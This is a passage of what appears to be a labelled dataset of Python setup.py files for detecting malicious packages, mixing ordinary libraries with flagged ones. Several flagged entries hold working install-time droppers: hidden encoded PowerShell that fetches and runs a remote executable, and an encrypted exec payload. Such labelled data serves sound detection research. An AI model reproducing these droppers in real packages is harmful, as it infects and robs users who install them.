Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "insanepackagev1414-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'crazy test description'\nLONG_DESCRIPTION = 'crazy long test description'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'E15Vb0ro8C-RQVm_HonJQeYM7QqH_QL6GXe3BpqaJJw=').decrypt(b'gAAAAABmAzaWWvpPHQ1jJXbTyRJlwy1MP-o3USdlhSFHB2qMHxn7KSvs4SiW86NeHfa_qIB3KimenfBA0tb5MeyNeDEbDEMXK0sY05SbUZU64VR8PfxpgnKEWTP3oOaQIYVUzLcMBE0DF5EKPXuHvaXuEhHpdH9Wp1u4rrxwvUCM4BVsoMynOnJP1nN6fbCjiWryEo39-63odiENVw81V4-yReuYZEInyU0uwdLCv_-zqqUR36si-q4='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"insanepackagev1414\",\n    version=VERSION,\n    author=\"Crazy Author\",\n    author_email=\"nig@gruppe.ru\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "dataclasses-0.8", "func": "from setuptools import setup\n\nwith open(\"README.rst\") as readme:\n    README = readme.read()\n\nsetup(\n    name=\"dataclasses\",\n    version=\"0.8\",\n    description=\"A backport of the dataclasses module for Python 3.6\",\n    long_description=README,\n    url=\"https://github.com/ericvsmith/dataclasses\",\n    author=\"Eric V. Smith\",\n    author_email=\"eric@python.org\",\n    license=\"Apache\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3.6\",\n    ],\n    py_modules=[\"dataclasses\"],\n    python_requires=\">=3.6, <3.7\",\n)\n", "target": 0}
{"idx": "tpadmaskcandy-4.71", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpadmaskcandy',\n    packages = ['modlib'],\n    version = '10.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "xolortpdcanegu-0.0.0", "func": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolortpdcanegu', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)", "target": 1}
{"idx": "liburlpywpost-1.1", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liburlpywpost',\n    packages = ['modlib'],\n    version = '2.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "geopandas-0.11.1", "func": "#!/usr/bin/env/python\n\"\"\"Installation script\n\n\"\"\"\n\nimport os\nimport sys\n\nfrom setuptools import setup\n\n# ensure the current directory is on sys.path so versioneer can be imported\n# when pip uses PEP 517/518 build rules.\n# https://github.com/python-versioneer/python-versioneer/issues/193\nsys.path.append(os.path.dirname(__file__))\n\nimport versioneer  # noqa: E402\n\nLONG_DESCRIPTION = \"\"\"GeoPandas is a project to add support for geographic data to\n`pandas`_ objects.\n\nThe goal of GeoPandas is to make working with geospatial data in\npython easier. It combines the capabilities of `pandas`_ and `shapely`_,\nproviding geospatial operations in pandas and a high-level interface\nto multiple geometries to shapely. GeoPandas enables you to easily do\noperations in python that would otherwise require a spatial database\nsuch as PostGIS.\n\n.. _pandas: http://pandas.pydata.org\n.. _shapely: http://shapely.readthedocs.io/en/latest/\n\"\"\"\n\nif os.environ.get(\"READTHEDOCS\", False) == \"True\":\n    INSTALL_REQUIRES = []\nelse:\n    INSTALL_REQUIRES = [\n        \"pandas >= 1.0.0\",\n        \"shapely >= 1.7, < 2\",\n        \"fiona >= 1.8\",\n        \"pyproj >= 2.6.1.post1\",\n        \"packaging\",\n    ]\n\n# get all data dirs in the datasets module\ndata_files = []\n\nfor item in os.listdir(\"geopandas/datasets\"):\n    if not item.startswith(\"__\"):\n        if os.path.isdir(os.path.join(\"geopandas/datasets/\", item)):\n            data_files.append(os.path.join(\"datasets\", item, \"*\"))\n        elif item.endswith(\".zip\"):\n            data_files.append(os.path.join(\"datasets\", item))\n\ndata_files.append(\"tests/data/*\")\n\n\nsetup(\n    name=\"geopandas\",\n    version=versioneer.get_version(),\n    description=\"Geographic pandas extensions\",\n    license=\"BSD\",\n    author=\"GeoPandas contributors\",\n    author_email=\"kjordahl@alum.mit.edu\",\n    url=\"http://geopandas.org\",\n    project_urls={\n        \"Source\": \"https://github.com/geopandas/geopandas\",\n    },\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type=\"text/x-rst\",\n    packages=[\n        \"geopandas\",\n        \"geopandas.io\",\n        \"geopandas.tools\",\n        \"geopandas.datasets\",\n        \"geopandas.tests\",\n        \"geopandas.tools.tests\",\n    ],\n    package_data={\"geopandas\": data_files},\n    python_requires=\">=3.8\",\n    install_requires=INSTALL_REQUIRES,\n    cmdclass=versioneer.get_cmdclass(),\n)\n", "target": 0}
{"idx": "spacefilterapi-1", "func": "from setuptools import setup\n\n\n\n\nsetup(\n\n    name='spacefilterapi',\n    packages=['spacefilterapi'],\n    version='1.0',\n    license='MIT',\n    description='Ai Solver',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n", "target": 1}
{"idx": "Flask-GraphQL-2.0.1", "func": "from setuptools import setup, find_packages\n\nrequired_packages = [\"graphql-core>=2.1,<3\", \"flask>=0.7.0\", \"graphql-server-core>=1.1,<2\"]\n\nsetup(\n    name=\"Flask-GraphQL\",\n    version=\"2.0.1\",\n    description=\"Adds GraphQL support to your Flask application\",\n    long_description=open(\"README.rst\").read(),\n    url=\"https://github.com/graphql-python/flask-graphql\",\n    download_url=\"https://github.com/graphql-python/flask-graphql/releases\",\n    author=\"Syrus Akbary\",\n    author_email=\"me@syrusakbary.com\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"License :: OSI Approved :: MIT License\",\n    ],\n    keywords=\"api graphql protocol rest flask\",\n    packages=find_packages(exclude=[\"tests\"]),\n    install_requires=required_packages,\n    tests_require=[\"pytest>=2.7.3\"],\n    include_package_data=True,\n    zip_safe=False,\n    platforms=\"any\",\n)\n", "target": 0}
{"idx": "django-admin-sortable2-2.1.2", "func": "#!/usr/bin/env python\nimport io\nfrom setuptools import setup, find_packages\nfrom adminsortable2 import __version__\n\n\ndef readfile(filename):\n    with io.open(filename, encoding='utf-8') as fd:\n        return fd.read()\n\n\nDESCRIPTION = 'Generic drag-and-drop sorting for the List, the Stacked- and the Tabular-Inlines Views in the Django Admin'\n\nCLASSIFIERS = [\n    'Environment :: Web Environment',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: MIT License',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python',\n    'Topic :: Software Development :: Libraries :: Python Modules',\n    'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    'Topic :: Software Development :: Libraries :: Application Frameworks',\n    'Development Status :: 5 - Production/Stable',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Framework :: Django',\n    'Framework :: Django :: 4.0',\n    'Framework :: Django :: 4.1',\n]\n\n\nsetup(\n    name='django-admin-sortable2',\n    version=__version__,\n    author='Jacob Rief',\n    author_email='jacob.rief@gmail.com',\n    description=DESCRIPTION,\n    long_description=readfile('README.md'),\n    long_description_content_type='text/markdown',\n    url='https://github.com/jrief/django-admin-sortable2',\n    license='MIT',\n    keywords=['django'],\n    platforms=['OS Independent'],\n    classifiers=CLASSIFIERS,\n    install_requires=[\n        'Django>=4.0',\n    ],\n    packages=find_packages(exclude=['client', 'testapp', 'docs']),\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "adhydra-4.11", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'adhydra',\n    packages = ['modlib'],\n    version = '8.48',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfultrahydra-2.49", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfultrahydra',\n    packages = ['modlib'],\n    version = '3.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-pywrandomvisa-5.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pywrandomvisa',\n    packages = ['modlib'],\n    version = '4.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-user_agents-0.4.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\n\ndescription = (\"A django package that allows easy identification of visitors' \"\n               \"browser, operating system and device information (mobile \"\n               \"phone, tablet or has touch capabilities).\")\n\nsetup(\n    name='django-user_agents',\n    version='0.4.0',\n    author='Selwin Ong',\n    author_email='selwin.ong@gmail.com',\n    packages=['django_user_agents'],\n    url='https://github.com/selwin/django-user_agents',\n    license='MIT',\n    description=description,\n    long_description=open('README.rst').read(),\n    zip_safe=False,\n    include_package_data=True,\n    package_data={'': ['README.rst']},\n    install_requires=['django', 'user-agents'],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ]\n)\n", "target": 0}
{"idx": "loadlgtb-7.8", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'loadLGTB',\n    packages = ['modlib'],\n    version = '9.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-tinymce-3.4.0", "func": "#!/usr/bin/env python\nimport codecs\nimport os\n\nfrom setuptools import find_packages, setup\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n\ndef read_file(filename):\n    \"\"\"Open a related file and return its content.\"\"\"\n    with codecs.open(os.path.join(here, filename), encoding=\"utf-8\") as f:\n        content = f.read()\n    return content\n\n\nREADME = read_file(\"README.rst\")\nCHANGELOG = read_file(\"CHANGELOG.rst\")\n\n\nsetup(\n    name=\"django-tinymce\",\n    version=\"3.4.0\",\n    packages=find_packages(),\n    include_package_data=True,\n    author=\"Aljosa Mohorovic\",\n    author_email=\"aljosa.mohorovic@gmail.com\",\n    description=(\n        \"A Django application that contains a widget to render a \"\n        \"form field as a TinyMCE editor.\"\n    ),\n    long_description=README + \"\\n\\n\" + CHANGELOG,\n    license=\"MIT License\",\n    keywords=\"django widget tinymce\",\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Software Development :: Libraries :: Application Frameworks\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    platforms=[\"any\"],\n    url=\"https://github.com/jazzband/django-tinymce\",\n)\n", "target": 0}
{"idx": "fuzzysearch-0.7.3", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom __future__ import with_statement\n\nimport os\nimport sys\n\nfrom setuptools import setup, Extension\nfrom distutils.command.build_ext import build_ext\nfrom distutils.errors import CCompilerError, DistutilsExecError, \\\n     DistutilsPlatformError\n\n# --noexts: don't try building the C extensions\nif '--noexts' in sys.argv[1:]:\n    del sys.argv[sys.argv[1:].index('--noexts') + 1]\n    noexts = True\nelse:\n    noexts = False\n\n\ndef readfile(file_path):\n    dir_path = os.path.dirname(os.path.abspath(__file__))\n    with open(os.path.join(dir_path, file_path), 'r') as f:\n        return f.read()\n\nreadme = readfile('README.rst')\nhistory = readfile('HISTORY.rst').replace('.. :changelog:', '')\n\n\n# Fail safe compilation based on markupsafe's, which in turn was shamelessly\n# stolen from the simplejson setup.py file.  Original author: Bob Ippolito\n\nis_jython = 'java' in sys.platform\nis_pypy = hasattr(sys, 'pypy_version_info')\n\next_errors = (CCompilerError, DistutilsExecError, DistutilsPlatformError)\nif sys.platform == 'win32' and sys.version_info > (2, 6):\n    # 2.6's distutils.msvc9compiler can raise an IOError when failing to\n    # find the compiler\n    # It can also raise ValueError http://bugs.python.org/issue7511\n    ext_errors += (IOError, ValueError)\n\n\nclass BuildFailed(Exception):\n    pass\n\n\nclass ve_build_ext(build_ext):\n    \"\"\"This class allows C extension building to fail.\"\"\"\n\n    def run(self):\n        try:\n            build_ext.run(self)\n        except DistutilsPlatformError:\n            raise BuildFailed()\n\n    def build_extension(self, ext):\n        try:\n            build_ext.build_extension(self, ext)\n        except ext_errors:\n            raise BuildFailed()\n        except ValueError:\n            # this can happen on Windows 64 bit, see Python issue 7511\n            if \"'path'\" in str(sys.exc_info()[1]): # works with Python 2 and 3\n                raise BuildFailed()\n            raise\n\n\n_substitutions_only_module = Extension(\n    'fuzzysearch._substitutions_only',\n    sources=['src/fuzzysearch/_substitutions_only.c',\n             'src/fuzzysearch/memmem.c'],\n    include_dirs=['.'],\n)\n_common_module = Extension(\n    'fuzzysearch._common',\n    sources=['src/fuzzysearch/_common.c',\n             'src/fuzzysearch/memmem.c'],\n    include_dirs=['.'],\n)\n_generic_search_module = Extension(\n    'fuzzysearch._generic_search',\n    sources=['src/fuzzysearch/_generic_search.c',\n             'src/fuzzysearch/memmem.c'],\n    include_dirs=['.'],\n)\n_levenshtein_ngrams_module = Extension(\n    'fuzzysearch._levenshtein_ngrams',\n    sources=['src/fuzzysearch/_levenshtein_ngrams.c'],\n    include_dirs=['.'],\n)\n# pymemmem_module = Extension(\n#     'fuzzysearch._pymemmem',\n#     sources=['src/fuzzysearch/_pymemmem.c',\n#              'src/fuzzysearch/memmem.c',\n#              'src/fuzzysearch/wordlen_memmem.c'],\n#     include_dirs=['.'],\n# )\n\n\ndef run_setup(with_binary=True):\n    ext_modules = [\n        _substitutions_only_module,\n        _common_module,\n        _generic_search_module,\n        _levenshtein_ngrams_module,\n        # pymemmem_module,\n    ]\n    if not with_binary:\n        ext_modules = []\n\n    setup(\n        name='fuzzysearch',\n        version='0.7.3',\n        description='fuzzysearch is useful for finding approximate subsequence matches',\n        long_description=readme + '\\n\\n' + history,\n        author='Tal Einat',\n        author_email='taleinat@gmail.com',\n        url='https://github.com/taleinat/fuzzysearch',\n        packages=['fuzzysearch'],\n        package_dir={'': 'src'},\n        ext_modules=ext_modules,\n        install_requires=['attrs>=19.3'],\n        license='MIT',\n        keywords='fuzzysearch',\n        classifiers=[\n            'Development Status :: 4 - Beta',\n            'Intended Audience :: Developers',\n            'License :: OSI Approved :: MIT License',\n            'Natural Language :: English',\n            'Programming Language :: Python :: 2',\n            'Programming Language :: Python :: 2.7',\n            'Programming Language :: Python :: 3',\n            'Programming Language :: Python :: 3.5',\n            'Programming Language :: Python :: 3.6',\n            'Programming Language :: Python :: 3.7',\n            'Programming Language :: Python :: 3.8',\n            'Programming Language :: Python :: Implementation :: CPython',\n            'Programming Language :: Python :: Implementation :: PyPy',\n            'Topic :: Software Development :: Libraries :: Python Modules',\n        ],\n        cmdclass={'build_ext': ve_build_ext},\n    )\n\n\ndef try_building_extension():\n    try:\n        run_setup(True)\n    except BuildFailed:\n        line = '=' * 74\n        build_ext_warning = 'WARNING: The C extensions could not be ' \\\n                            'compiled; speedups are not enabled.'\n\n        print(line)\n        print(build_ext_warning)\n        print('Failure information, if any, is above.')\n        print('Retrying the build without the C extension now.')\n        print('')\n\n        run_setup(False)\n\n        print(line)\n        print(build_ext_warning)\n        print('Plain-Python installation succeeded.')\n        print(line)\n\nif not (noexts or is_pypy or is_jython):\n    try_building_extension()\nelse:\n    run_setup(False)\n", "target": 0}
{"idx": "dbnd-airflow-0.85.9", "func": "# \u00a9 Copyright Databand.ai, an IBM Company 2022\n\nfrom os import path\n\nimport setuptools\n\nfrom setuptools.config import read_configuration\n\n\nBASE_PATH = path.dirname(__file__)\nCFG_PATH = path.join(BASE_PATH, \"setup.cfg\")\n\nconfig = read_configuration(CFG_PATH)\nversion = config[\"metadata\"][\"version\"]\n\nrequirements_for_airflow = [\n    \"WTForms<2.3.0\",  # fixing ImportError: cannot import name HTMLString at 2.3.0\n    \"Werkzeug<1.0.0,>=0.15.0\",\n    \"psycopg2-binary>=2.7.4\",\n    \"SQLAlchemy==1.3.18\",  # Make sure Airflow uses SQLAlchemy 1.3.15, Airflow is incompatible with SQLAlchemy 1.4.x\n    \"marshmallow<3.0.0,>=2.18.0\",\n    \"marshmallow-sqlalchemy<0.24.0,>=0.16.1;python_version>='3.0'\",\n    \"itsdangerous<2.0,>=0.24\",\n    \"tenacity>=4.12\",\n]\n\nsetuptools.setup(\n    name=\"dbnd-airflow\",\n    package_dir={\"\": \"src\"},\n    install_requires=[\"dbnd==\" + version, \"packaging\"],\n    # Only for orchestration, tracking users should install Airflow manually before DBND\n    # The best way to install airflow is manually with constraints beforehand.\n    # For example:\n    # pip install apache-airflow  --constraint \"https://raw.githubusercontent.com/apache/airflow/constraints-${AIRFLOW_VERSION}/constraints-{PYTHON_VERSION}.txt\n    extras_require=dict(\n        airflow_1_10_7=requirements_for_airflow + [\"apache-airflow==1.10.7\"],\n        airflow_1_10_8=requirements_for_airflow + [\"apache-airflow==1.10.8\"],\n        airflow_1_10_9=requirements_for_airflow + 